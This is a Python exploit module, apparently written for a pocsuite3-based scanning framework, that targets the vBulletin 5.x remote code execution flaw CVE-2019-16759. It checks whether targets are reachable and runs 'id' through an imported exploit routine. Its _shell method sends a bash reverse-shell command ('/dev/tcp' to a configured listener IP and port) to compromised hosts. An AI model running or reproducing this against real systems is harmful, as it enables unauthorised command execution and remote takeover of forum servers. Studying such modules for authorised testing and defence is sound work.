"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2019_16759 import vBulletin_rce


class DemoPOC(POCBase):
    vulID = 'CVE-2019-16759'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '30/08/2019'
    createDate = '2021-09-15'
    
    updateDate = '2021-09-15'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2019-16759']
    name = 'vBulletin 5.x Remote Code Execution vulnerability '
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.JAVA],
                "pocType" : "CMS", 
                "folder_init": "cve_2019_16759"}
    appName = 'vBulletin-cve-2019-16759'
    appVersion = 'CVE-2019-16759'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring request.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}


    def _verify(self, update=True):
        if update: 
            config_input,Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        self.result_url = []
        for url in self.url: 
            try: 
                res = requests.get(url, timeout=5)
                if res.status_code == 200: 
                    self.result_url.append(url)
            except Exception as e : 
                pass
        if len(self.result_url) > 0 : 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.result_url
        if update: 
            return self.parse_output(result)
        else: 
            return result
       

    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                try: 
                    info = vBulletin_rce.exploit(url,"attack", "id")
                    if info: 
                        vul_url.append(url)
                except Exception as e: 
                    pass
            print(vul_url)
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                return self.parse_output(result)
            else: 
                return self.parse_output(False)
        else: 
            return self.parse_output(False)

    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            command = "bash -i >&/dev/tcp/{0}/{1} 0>&1".format(lhost_running, lport_running)
            vBulletin_rce.exploit(self.url,"shell", command)
            result['ShellInfo']["url"] = self.url
            result['ShellInfo']["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)
        
                 
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
